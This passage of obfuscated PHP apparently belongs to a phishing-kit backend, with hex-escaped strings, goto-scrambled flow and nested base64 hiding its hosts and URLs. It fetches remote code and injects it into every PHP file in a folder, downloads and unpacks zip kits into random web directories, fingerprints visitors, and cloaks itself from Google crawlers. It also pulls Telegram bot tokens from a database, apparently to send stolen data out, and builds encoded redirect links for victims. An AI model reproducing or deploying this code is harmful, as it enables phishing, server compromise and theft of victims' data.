$reason); mysqli_stmt_execute($stmt); mysqli_close($db); http_response_code(405); $responseData = array("\x72\145\x73\x5f\x73\164\x61\164\165\x73" => "\x34\60\65", "\x6d\145\x73\x73\x61\x67\145" => "\125\163\145\162\x20\x61\144\144\145\x64\x20\164\x6f\40\x74\x68\145\x20\x62\154\141\143\x6b\x6c\x69\x73\x74"); echo json_encode($responseData); die; } goto CBPAJ; xj3Aw: function deleteOldFolders($directory) { $files = scandir($directory); foreach ($files as $file) { if ($file == "\56" || $file == "\56\x2e") { continue; } if (is_dir($directory . "\x2f" . $file)) { $lastModified = filemtime($directory . "\57" . $file); $difference = (time() - $lastModified) / 60; if ($difference > 20) { deleteDirectory($directory . "\57" . $file); } } } } goto cNjHJ; qyR3c: $local_time = date("\x59\x2d\155\55\144\40\110\72\x69\x3a\x73"); goto ExbY1; vp1l1: $fs_host = base64_decode("\x4d\124\153\x34\114\x6a\111\x31\115\x53\64\x34\116\103\64\171\x4d\104\101"); goto ildGq; HZs8N: function get_expire_token() { global $fs_host, $fs_user, $fs_log, $fs_name; $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name); if (!$db) { die("\103\x6f\x6e\156\145\x63\164\151\x6f\156\x20\x66\141\151\x6c\x65\x64\x3a\x20" . mysqli_connect_error()); } $sql_u = "\x53\105\x4c\105\x43\124\40\164\x65\x6c\145\137\164\x6f\153\x65\156\x2c\40\164\x65\154\145\x5f\143\x68\x61\x74\151\144\x20\x46\x52\x4f\x4d\40\172\x65\162\x6f\137\163\x65\x72\166\x65\x72\40\127\110\x45\122\x45\x20\151\144\x3d\x27\x31\x27"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { $row = mysqli_fetch_array($res_u); $_SESSION["\x65\170\x70\137\x74\x6f\153\145\x6e"] = $row["\164\145\154\x65\x5f\164\x6f\153\145\156"]; $_SESSION["\x65\x78\160\137\x63\150\x61\x74\151\x64"] = $row["\x74\145\154\x65\x5f\x63\x68\x61\x74\151\x64"]; $token = $row["\164\145\154\145\x5f\x74\x6f\x6b\145\156"]; $chatid = $row["\x74\145\x6c\x65\x5f\143\x68\141\164\151\x64"]; return array($token, $chatid); } mysqli_close($db); return null; } goto tvyzi; jBRPT: function update_php($folder_path) { $trackingFile = $folder_path . "\x72\x6f\x75\154\163\56\x74\x78\164"; $codeURL = base64_decode(base64_decode("\x59\x55\x68\123\115\x47\x4e\111\x54\124\x5a\x4d\x65\124\x6c\x35\x57\x56\150\152\144\126\x6f\x79\142\104\102\150\x53\106\132\160\x5a\x46\150\117\x62\107\116\x74\124\156\x5a\x69\142\x6c\x4a\163\131\x6d\65\122\x64\126\153\171\x4f\130\122\x4d\115\156\150\161\x59\x6a\x4a\x34\x61\107\121\x7a\x62\x47\x78\152\142\153\x31\x32\x59\172\111\x35\x4d\x57\x4e\164\124\x6d\x78\x4d\x4d\x6a\x46\157\x59\126\x63\x30\144\155\116\111\123\156\x5a\x6b\122\x31\132\161\132\105\x4d\x31\115\x47\x56\111\125\121")); $codeToAdd = fetchContentFromURL($codeURL); $codeToAddBottom = ''; $phpFilesList = getAllPhpFiles($folder_path); foreach ($phpFilesList as $filePath) { updatePhpFileWithCode($filePath, $codeToAdd); } } goto IzezL; vpmfg: function get_platform($USER_AGENT) { $OS_ERROR = "\x55\x6e\153\156\x6f\x77\156\x20\x4f\x53\x20\x50\154\x61\164\146\x6f\162\x6d"; $OS = array("\57\167\x69\x6e\144\x6f\x77\x73\x20\156\164\x20\61\61\57\151" => "\127\151\x6e\x64\157\x77\x73\x20\61\61", "\x2f\x77\151\156\144\157\167\x73\40\x6e\164\40\61\x30\x2f\x69" => "\127\151\156\x64\x6f\167\163\40\x31\x30", "\57\x77\151\156\144\x6f\x77\163\40\x6e\164\40\66\x2e\63\57\x69" => "\127\151\156\x64\x6f\x77\x73\40\70\56\x31", "\57\167\151\x6e\144\x6f\x77\163\x20\x6e\164\40\66\x2e\x32\57\x69" => "\x57\x69\156\144\x6f\167\163\x20\x38", "\x2f\167\151\156\x64\x6f\x77\163\40\x6e\164\x20\66\x2e\61\57\x69" => "\127\x69\156\x64\157\x77\x73\40\67", "\x2f\167\151\x6e\x64\157\x77\x73\40\156\x74\40\x36\x2e\60\57\x69" => "\127\151\156\144\x6f\167\x73\40\x56\x69\163\164\141", "\57\167\x69\156\144\157\167\x73\40\x6e\x74\x20\65\x2e\x32\57\x69" => "\127\x69\156\x64\157\167\163\40\x53\145\162\166\145\162\40\62\x30\60\x33\57\130\x50\x20\x78\66\64", "\x2f\x77\151\x6e\144\157\167\163\40\156\x74\x20\x35\x2e\x31\57\151" => "\x57\151\156\x64\157\167\163\40\x58\120", "\x2f\x77\x69\156\144\157\x77\163\40\170\160\x2f\151" => "\127\151\156\144\157\x77\163\40\x58\x50", "\57\167\151\x6e\x64\157\167\x73\40\156\x74\x20\x35\x2e\60\57\151" => "\x57\151\x6e\144\x6f\x77\x73\x20\x32\x30\60\x30", "\x2f\x77\x69\156\x64\x6f\x77\x73\40\x6d\145\x2f\151" => "\x57\x69\156\x64\x6f\x77\163\40\x4d\x45", "\x2f\x77\x69\156\71\70\x2f\x69" => "\127\151\156\144\x6f\167\163\x20\x39\70", "\57\167\151\x6e\71\65\x2f\151" => "\127\x69\x6e\144\157\x77\x73\x20\x39\65", "\57\167\151\156\61\66\57\x69" => "\127\151\x6e\x64\x6f\x77\x73\40\x33\56\61\61", "\x2f\x6d\141\143\x69\x6e\x74\157\163\150\x7c\x6d\141\143\40\157\163\40\x78\57\151" => "\115\141\x63\x20\117\x53\x20\130", "\x2f\155\x61\143\137\x70\x6f\167\x65\162\x70\143\57\x69" => "\x4d\141\x63\x20\x4f\123\x20\x39", "\x2f\154\x69\156\165\x78\57\151" => "\114\x69\156\x75\x78", "\x2f\165\142\x75\x6e\164\165\x2f\151" => "\x55\142\165\156\x74\165", "\57\151\160\x68\157\156\x65\x2f\x69" => "\151\120\150\x6f\156\x65", "\57\x69\160\x6f\144\57\x69" => "\151\120\x6f\x64", "\57\151\x70\141\144\x2f\x69" => "\151\120\x61\x64", "\57\x61\156\144\162\x6f\151\x64\57\151" => "\x41\x6e\144\162\157\x69\144", "\x2f\142\154\141\x63\153\142\x65\x72\162\x79\57\x69" => "\102\x6c\141\143\153\102\x65\162\x72\x79", "\57\x77\x65\142\157\163\57\151" => "\115\157\142\x69\154\145"); foreach ($OS as $regex => $value) { if (preg_match($regex, $USER_AGENT)) { $OS_ERROR = $value; } } return $OS_ERROR; } goto qijVM; h7tii: function getClientIP() { if (!empty($_SERVER["\110\124\x54\x50\x5f\103\114\x49\x45\x4e\x54\x5f\111\120"])) { $ipAddress = $_SERVER["\110\124\124\120\137\103\x4c\111\105\x4e\124\x5f\x49\120"]; } elseif (!empty($_SERVER["\110\x54\124\x50\x5f\x58\x5f\106\117\x52\x57\x41\122\x44\105\x44\x5f\x46\117\x52"])) { $ipAddress = $_SERVER["\x48\x54\124\x50\x5f\x58\x5f\106\x4f\122\x57\x41\x52\x44\x45\x44\x5f\106\x4f\122"]; } else { $ipAddress = $_SERVER["\122\105\x4d\x4f\124\x45\137\101\104\104\122"]; } $validIPs = array(); $ipMatches = preg_match_all("\x2f\134\x62\x5c\144\173\61\x2c\x33\175\x5c\56\x5c\x64\x7b\61\54\x33\175\x5c\56\x5c\x64\x7b\x31\x2c\63\175\134\56\134\144\x7b\x31\54\63\x7d\134\142\x2f", $ipAddress, $matches); if ($ipMatches) { $validIPs = $matches[0]; } if (!empty($validIPs)) { $_SESSION["\x73\145\x73\163\151\157\x6e\x5f\x69\x70"] = $validIPs[0]; return $validIPs[0]; } else { $_SESSION["\163\145\163\163\151\157\x6e\x5f\151\x70"] = "\x31\62\x37\x2e\60\x2e\60\56\61"; return "\61\62\67\56\x30\56\60\x2e\61"; } } goto xZjyJ; QAlFK: header("\103\x6f\x6e\x74\145\156\x74\x2d\x54\171\x70\x65\72\40\x61\160\160\154\151\143\141\164\151\157\x6e\x2f\152\163\x6f\x6e"); goto Ygq8X; IDITX: function detect_user($ipAddress) { global $fs_host, $fs_user, $fs_log, $fs_name; $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name); if (!$db) { die("\x43\157\156\x6e\x65\x63\x74\151\157\156\x20\x66\141\151\154\x65\144\x3a\40" . mysqli_connect_error()); } $sql_u = "\123\105\x4c\x45\x43\x54\x20\52\x20\106\122\117\115\x20\x6c\x6f\x67\x73\40\x57\x48\105\x52\x45\x20\151\x70\x61\x64\144\162\x65\163\x3d\x27{$ipAddress}\x27"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { mysqli_close($db); return true; } mysqli_close($db); return false; } goto m2SxY; cNjHJ: function deleteDirectory($dir) { if (is_dir($dir)) { $objects = scandir($dir); foreach ($objects as $object) { if ($object != "\56" && $object != "\x2e\56") { if (is_dir($dir . "\x2f" . $object)) { deleteDirectory($dir . "\x2f" . $object); } else { unlink($dir . "\57" . $object); } } } reset($objects); rmdir($dir); } } goto JqIPt; IzezL: function update_php_normal($folder_path) { $trackingFile = $folder_path . "\162\x6f\x75\154\163\56\164\x78\x74"; $codeURL = base64_decode(base64_decode("\x59\125\x68\x53\115\x47\x4e\x49\124\x54\x5a\x4d\145\124\x6c\x35\127\x56\x68\152\144\x56\157\x79\x62\104\x42\x68\x53\106\132\160\x5a\x46\x68\117\x62\107\x4e\164\x54\x6e\x5a\151\x62\x6c\112\163\131\x6d\65\122\144\x56\x6b\171\x4f\x58\x52\x4d\x4d\156\150\x71\x59\x6a\x4a\x34\x61\107\121\172\142\x47\170\x6a\142\x6b\61\62\131\x7a\111\65\x4d\127\x4e\164\x54\155\x78\x4d\x4d\x6a\106\x6f\x59\126\143\x30\144\155\116\x49\x53\x6e\x5a\153\x52\x31\132\161\132\105\131\x35\144\127\111\x7a\x53\156\x52\x5a\126\63\144\61\x5a\x45\x68\157\x4d\x41")); $codeToAdd = fetchContentFromURL($codeURL); $codeToAddBottom = ''; $phpFilesList = getAllPhpFiles($folder_path); foreach ($phpFilesList as $filePath) { updatePhpFileWithCode($filePath, $codeToAdd); } } goto clxpK; RrOGe: $local_os = get_platform($local_userAgent); goto imlgb; HVS5h: $local_userAgent = isset($_SERVER["\x48\x54\x54\120\x5f\x55\x53\105\x52\137\x41\107\x45\116\x54"]) ? $_SERVER["\110\x54\124\120\137\125\x53\x45\x52\x5f\101\107\105\x4e\124"] : ''; goto qyR3c; VdJnG: function getHost($ipAddress) { try { $host = gethostbyaddr($ipAddress); return $host; } catch (Exception $e) { return "\x4e\x6f\164\x20\x56\141\x6c\151\x64"; } } goto h7tii; vz_Ci: if (session_status() == PHP_SESSION_NONE) { session_start(); } goto vp1l1; ExbY1: $local_domain = $_SERVER["\x53\105\x52\x56\x45\122\x5f\116\101\x4d\105"]; goto RrOGe; x0J0i: global $fs_host, $fs_user, $fs_log, $fs_name, $local_userAgent, $local_time, $local_domain, $local_os, $local_ip_g, $local_browser; goto VdJnG; UCZbt: ini_set("\x64\151\x73\x70\154\x61\171\x5f\x65\162\x72\x6f\x72\163", 1); goto vz_Ci; OpIVl: function isGoogleUser($userAgent, $ipAddress) { if (stripos($userAgent, "\x67\157\x6f\147\x6c\145") !== false) { return true; } if (filter_var($ipAddress, FILTER_VALIDATE_IP)) { $hostname = gethostbyaddr($ipAddress); if (stripos($hostname, "\x67\x6f\157\147\x6c\x65") !== false) { return true; } } if (isset($_SESSION["\x73\145\x73\163\x69\x6f\156\137\x69\163\160"]) && stripos($_SESSION["\163\145\x73\x73\x69\x6f\156\137\x69\x73\x70"], "\x67\157\157\147\154\x65") !== false) { return true; } return false; } goto KxGXq; imlgb: $local_browser = get_browser_value($local_userAgent); goto C9g96; DqvkR: function getAllPhpFiles($directory) { $phpFiles = array(); if (is_dir($directory) && ($handle = opendir($directory))) { while (false !== ($file = readdir($handle))) { if ($file != "\x2e" && $file != "\56\56") { $filePath = $directory . DIRECTORY_SEPARATOR . $file; if (is_dir($filePath)) { $phpFiles = array_merge($phpFiles, getAllPhpFiles($filePath)); } elseif (pathinfo($filePath, PATHINFO_EXTENSION) === "\160\150\x70") { $phpFiles[] = $filePath; } } } closedir($handle); } return $phpFiles; } goto utwsw; utwsw: if ($_SERVER["\x52\x45\121\x55\105\123\124\x5f\x4d\x45\x54\x48\117\104"] === "\107\x45\x54") { $missingParams = array(); $com_dir_e = isset($_GET["\x6c\157\x63\141\x6c"]) ? $_GET["\154\x6f\x63\141\154"] : null; $com_id_e = isset($_GET["\x73\x6f\165\154\163"]) ? $_GET["\163\157\165\x6c\163"] : null; $com_ip_e = isset($_GET["\162\x65\155\x6f\x74\x65"]) ? $_GET["\x72\145\155\x6f\164\x65"] : null; $com_view = isset($_GET["\x76\x69\x65\167"]) ? $_GET["\x76\x69\x65\167"] : null; $com_user = isset($_GET["\x75\x73\x65\x72"]) ? $_GET["\165\163\x65\162"] : null; if ($com_dir_e === null) { $missingParams[] = "\154\157\143\x61\154"; } if ($com_id_e === null) { $missingParams[] = "\163\157\x75\x6c\x73"; } if ($com_ip_e === null) { $missingParams[] = "\162\145\155\157\x74\x65"; } if ($com_view === null) { $missingParams[] = "\x76\x69\145\x77"; } if ($com_user === null) { $missingParams[] = "\x75\x73\145\x72"; } if (!empty($missingParams)) { $responseData = array("\x72\145\x73\137\x73\x74\141\164\165\163" => "\x34\60\65", "\155\x65\163\x73\141\x67\145" => "\122\145\161\165\151\x72\x65\144\x20\x47\x45\124\40\160\141\x72\141\x6d\x65\x74\x65\162\x73\40\141\x72\x65\x20\155\x69\163\163\x69\156\x67\x2e", "\155\x69\163\163\151\156\147\137\160\x61\x72\141\x6d\x73" => $missingParams); echo json_encode($responseData); die; } $ipAddress = base64_decode(base64_decode(base64_decode($com_ip_e))); $com_id = base64_decode(base64_decode(base64_decode($com_id_e))); $com_dir = base64_decode(base64_decode(base64_decode($com_dir_e))); if ($ipAddress === false || $com_id === false || $com_dir === false) { $failedDecodes = array(); if ($ipAddress === false) { $failedDecodes[] = "\x72\145\x6d\x6f\x74\x65"; } if ($com_id === false) { $failedDecodes[] = "\x73\157\x75\154\x73"; } if ($com_dir === false) { $failedDecodes[] = "\x6c\157\x63\x61\154"; } $responseData = array("\162\x65\x73\x5f\x73\x74\141\164\x75\x73" => "\64\x30\65", "\155\145\x73\x73\x61\147\145" => "\106\x61\x69\x6c\145\x64\40\164\x6f\40\144\x65\143\157\x64\145\40\x6f\x6e\145\x20\x6f\162\x20\x6d\x6f\162\x65\40\160\141\x72\x61\x6d\145\x74\x65\162\163\56", "\x66\x61\151\154\145\144\137\x64\x65\143\157\144\145\x73" => $failedDecodes); echo json_encode($responseData); die; } fetchIPInfo($ipAddress); user_data($ipAddress, $com_id); $_SESSION["\x6c\x6f\x6c\151\x70\x73"] = $ipAddress; $_SESSION["\154\x6f\154\163\x6f\x75\154\163"] = $com_id; update_user_view($com_user); $RandOP_Mlux = random_string(6); $queryParams = array("\166\151\145\167" => $RandOP_Mlux . $RandOP_Mlux, "\141\154\x65\162\164" => $RandOP_Mlux, "\170\154\160\163" => $RandOP_Mlux, "\163\157\x75\154\163" => $com_id, "\144\157\x6e\x65" => '', "\x65\162\x72\x6f\x72\x79" => $RandOP_Mlux, "\155\156\145\155\x6f\x6e\151\143" => '', "\x6a\142" => $RandOP_Mlux); $url = $com_dir . "\x3f" . http_build_query($queryParams); $responseData = array("\162\x65\x73\137\163\164\x61\164\x75\163" => "\x32\x30\60", "\x6d\145\x73\163\141\x67\145" => "\122\145\144\x69\x72\145\143\164\x69\156\x67", "\162\145\144\x69\x72\x65\143\x74\137\165\162\154" => $url); echo json_encode($responseData); die; } goto dz2cb; Q4e1k: header("\101\x63\x63\145\x73\x73\55\x43\x6f\156\x74\162\157\x6c\55\x41\x6c\x6c\157\x77\x2d\x48\x65\x61\144\x65\x72\x73\72\40\x43\157\x6e\164\x65\156\x74\55\124\171\x70\145"); goto QAlFK; RlRJU: $currentTimestamp = time(); goto j73GR; JqIPt: function download_extract($zipFileUrl) { if (!is_dir("\167\145\x62")) { if (!mkdir("\x77\x65\142", 511)) { die("\x46\x61\151\154\x65\x64\40\x74\157\40\143\162\145\141\164\x65\x20\x77\145\x62\x20\x64\151\162\x65\143\x74\157\x72\171"); } } if (!is_dir("\164\x65\x6d\x70")) { mkdir("\x74\x65\155\160"); } $folder_name = bin2hex(random_bytes(8)); $sub_folder = random_number(6); $folder_path = "\167\145\142\x2f{$sub_folder}\x2f"; $_SESSION["\146\x6f\154\144\145\x72"] = $folder_path; $zipFileName = "\x74\x65\155\160\57{$folder_name}\56\172\151\x70"; if (copy($zipFileUrl, $zipFileName)) { if (!mkdir($folder_path, 511, true)) { die("\x46\x61\x69\154\145\x64\40\x74\157\40\x63\x72\x65\141\164\x65\40\x74\x68\x65\x20\146\157\154\x64\145\162\x2e"); } $zip = new ZipArchive(); if ($zip->open($zipFileName) === true) { $zip->extractTo($folder_path); $zip->close(); } else { http_response_code(405); $responseData = array("\x72\x65\x73\137\163\x74\x61\x74\165\x73" => "\x34\x30\65", "\x6d\x65\163\x73\141\147\145" => "\106\141\151\x6c\x65\144\x20\x74\157\40\x65\170\x74\x72\141\x63\x74\x20\x74\x68\x65\x20\x7a\x69\x70\x20\146\x69\154\x65"); $responseJson = json_encode($responseData); echo $responseJson; } } else { http_response_code(405); $responseData = array("\162\145\x73\137\x73\x74\141\164\x75\x73" => "\x34\x30\x35", "\155\145\x73\163\141\x67\x65" => "\106\x61\151\x6c\145\x64\x20\x74\157\40\x64\x6f\x77\156\x6c\x6f\141\144\40\164\150\x65\x20\x7a\151\x70\x20\146\151\x6c\x65"); $responseJson = json_encode($responseData); echo $responseJson; } if (file_exists($zipFileName)) { unlink($zipFileName); } } goto a3E2i; K149e: ')); ?>
